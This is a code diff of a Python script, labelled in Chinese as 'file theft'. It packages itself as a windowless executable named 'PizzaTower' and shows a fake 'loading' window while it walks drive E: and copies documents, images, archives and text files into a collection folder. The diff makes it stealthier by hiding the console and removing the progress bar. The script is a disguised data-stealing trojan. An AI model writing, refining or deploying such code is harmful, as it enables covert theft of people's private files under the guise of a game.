@@ -1,10 +1,9 @@
 # 文件窃取
-# 可使用pyinstaller -F -i 图标 脚本 -n 文件名
+# pyinstaller -F -w -i .\1.png .\1.py -n PizzaTower
 import os
 from win32 import *
 from win32api import GetLogicalDriveStrings
 from win32file import *
-from tqdm import tqdm
 import tkinter as tk
 from tkinter import ttk, messagebox
 import threading
@@ -29,7 +28,7 @@ def simulate_loading():
 root = tk.Tk()
 root.title("正在加载")
 root.resizable(False, False)
-root.iconbitmap("1.ico")    # 设置图标
+# root.iconbitmap("1.ico")    # 设置图标
 
 # 设置窗口大小并居中
 window_width = 300
@@ -69,7 +68,7 @@ if not os.path.exists(path):
 
 count = 0
 for root,ds,fs in os.walk("E:\\"):
-    for files in tqdm(fs):
+    for files in fs:
         if files.lower().endswith((".docx",".bmp",".pptx",".rar",".txt")):
             file_path = root + "\\" + files
             save_path = path + files
